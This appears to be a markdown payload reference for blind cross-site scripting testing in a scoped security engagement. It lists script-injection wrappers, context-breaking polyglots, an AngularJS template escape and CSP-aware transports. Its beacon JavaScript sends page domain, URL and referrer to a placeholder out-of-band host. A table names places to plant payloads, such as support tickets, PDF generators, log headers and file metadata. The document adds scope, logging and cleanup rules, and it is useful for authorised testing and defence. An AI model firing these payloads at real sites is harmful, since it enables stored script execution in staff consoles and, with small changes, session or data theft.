# Blind XSS beacon payloads (step 3)
# You can't see the render, so the payload must PHONE HOME on execution, carrying enough context to
# prove JS ran and to attribute the fire. Token goes in the OOB hostname/path. BENIGN only.
# Record in injections.jsonl: {token, surface, field, payload, injected_at}.

## Core beacon — remote script that exfils minimal context
```html
"><script src=//TOKEN.oob.example></script>
```
`TOKEN.oob.example` serves JS that beacons back the fire context:
```js
// served by your OOB host for TOKEN:
new Image().src = '//TOKEN.oob.example/b?d=' + encodeURIComponent(
  document.domain + '|' + location.href + '|c' + document.cookie.length);
```
The HTTP beacon (not just the script DNS/GET) with `document.domain` proves JS executed in that
context — exactly what verify.md requires. `document.cookie.length` (a number) keeps it benign.

## Context-agnostic variants (unknown render context)
```html
"><svg/onload=import('//TOKEN.oob.example/m.js')>
"><img src=x onerror="import('//TOKEN.oob.example/m.js')">
javascript:import('//TOKEN.oob.example/m.js')
```
Polyglot (one payload, many contexts — confirm the real context from the beacon):
```
'"></textarea></title></style></script><svg/onload=import('//TOKEN.oob.example/m.js')>//
```

## Renderer-specific
- **PDF/doc engines:** some execute JS during generation — a `<script>`/`<img onerror>` in a field
  that lands in a generated PDF can fire server-side; beacon reveals it.
- **Email HTML:** JS mostly stripped; test anyway — a fire indicates a dangerous mail renderer.
- **Markdown surfaces:** `[x](javascript:import('//TOKEN.oob.example/m.js'))` / raw HTML passthrough.

## Notes
- Distinct token per injection = attribution (non-negotiable; verify.md rejects ambiguous callbacks).
- A DNS-only or plain-GET hit (no JS-derived data) is NOT proof of XSS — could be a URL parser, link
  preview, or AV. The beacon must carry something only running JS could produce.
- Everything is scope-gated + logged; record injected artifacts in cleanup.md for removal.

---

## Extended arsenal — beacon transport variety
Every beacon carries a per-injection token in the OOB host/path AND something only running JS can produce
(domain, href, cookie length). BENIGN only. Pick the transport the render surface's policy allows.
```js
// Image GET — most permissive (img-src commonly open):
new Image().src='//TOKEN.oob.example/b?d='+encodeURIComponent(document.domain+'|'+location.href);
// fetch — needs connect-src:
fetch('//TOKEN.oob.example/b?d='+encodeURIComponent(document.domain));
// sendBeacon — survives unload (log viewers that navigate away):
navigator.sendBeacon('//TOKEN.oob.example/b', document.domain);
// dynamic script — needs script-src; a fire also proves a script-src gap:
document.body.appendChild(Object.assign(document.createElement('script'),{src:'//TOKEN.oob.example/j'}));
// navigation beacon — no connect-src needed:
location='//TOKEN.oob.example/n?'+encodeURIComponent(document.domain);
// WebSocket — needs connect-src ws:/wss::
new WebSocket('wss://TOKEN.oob.example').onopen=e=>e.target.send(document.domain);
// DNS/prefetch — WEAK (DNS/GET only, no JS-derived data) — last resort, pair with another:
<link rel=dns-prefetch href=//TOKEN.oob.example>
```
Rule (verify.md): a DNS-only / plain-GET hit with NO JS-derived data is NOT proof (could be a link
preview, URL parser, or AV). The HTTP beacon MUST carry `document.domain`/`location.href`/a DOM value.

## Extended arsenal — injection wrappers for an unknown render context
```html
"><script src=//TOKEN.oob.example></script>
"><svg onload="import('//TOKEN.oob.example/m.js')">
"><img src=x onerror="import('//TOKEN.oob.example/m.js')">
"><iframe srcdoc="&lt;script src=//TOKEN.oob.example&gt;&lt;/script&gt;">
'};import('//TOKEN.oob.example/m.js');//                 # JS string/template context
</script><script src=//TOKEN.oob.example></script>       # inside an echoing <script>
javascript:import('//TOKEN.oob.example/m.js')            # URL/href field
{{constructor.constructor("import('//TOKEN.oob.example/m.js')")()}}   # AngularJS surface
```
Polyglots (one value, many contexts — the beacon tells you which fired):
```
'"></textarea></title></style></noscript></template></script><svg/onload=import('//TOKEN.oob.example/m.js')>//
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */import(/* */'//TOKEN.oob.example/m.js')//
```

## Extended arsenal — renderer-specific blind surfaces
| Inject at | Renderer that fires it | Vector | Beacon note |
|---|---|---|---|
| support / ticket / contact field | staff web console | standard HTML handler | classic; delayed fire — keep listener up |
| invoice / order / address field | server-side PDF engine | handler/`<script>` landing in the PDF | some engines run JS during generation |
| doc / report export | headless-browser renderer | HTML handler | fires on CI/worker egress IP |
| filename / EXIF author/comment | file browser, gallery, admin | `"><svg onload=…>` in metadata | test metadata, not just content |
| log / analytics (UA / Referer / XFF) | admin log viewer / dashboard | `<svg/onload=…>` in the header | inject on otherwise-normal requests |
| error-triggering input | dev error-monitor dashboard | handler in the exception message | exceptions rendered to devs |
| chat / DM / comment to staff | moderator / agent view | HTML handler | privileged viewer = high impact |
| email-bound name / subject | recipient webmail client | HTML handler | JS mostly stripped; a fire = dangerous renderer |
| markdown field | wiki / notes renderer | `[x](javascript:import('//TOKEN.oob.example/m.js'))` | raw-HTML passthrough too |
| link/URL field unfurled by a bot | chat-app link-preview fetcher | the fetch is server-side | need JS-derived data to distinguish from a mere bot-fetch |
| mobile-app field | in-app WebView | HTML handler | fires in the app; beacon proves the domain |

## Extended arsenal — CSP-aware blind beacons
Under an unseen policy, try transports from most to least permissive and let the fire map the policy:
```
# 1. img:          new Image().src='//TOKEN.oob.example/i?'+document.domain      (img-src usually open)
# 2. navigation:   location='//TOKEN.oob.example/n?'+document.domain            (no connect-src needed)
# 3. form POST:    <form action=//TOKEN.oob.example method=POST id=f><input name=d></form>  f.submit()
# 4. prefetch:     <link rel=prefetch href=//TOKEN.oob.example/p>               (weak — DNS/GET only)
```
Only a nonce'd/allowlisted script-src present ⇒ a remote `<script src>` won't load; fall back to an inline
handler beacon via `new Image()` (needs the handler to run). Record WHICH transport fired — that maps the policy.

## Extended arsenal — attribution & anti-false-positive
- One distinct token per (surface, field), baked into the OOB subdomain so DNS logs alone attribute the
  surface; the HTTP beacon adds the JS-derived proof.
- Carry a fire-time fingerprint: `document.domain + '|' + location.href + '|ref=' + document.referrer`. If
  the domain is NOT the target's, you proved XSS in a THIRD-party renderer — note it and scope-check it.
- Keep the listener up for the delayed-fire window (a human may open the ticket hours later).
- `document.cookie.length` (a number), never the cookie; no real user data in the beacon.
- Log every injection in injections.jsonl and every artifact in cleanup.md for removal.
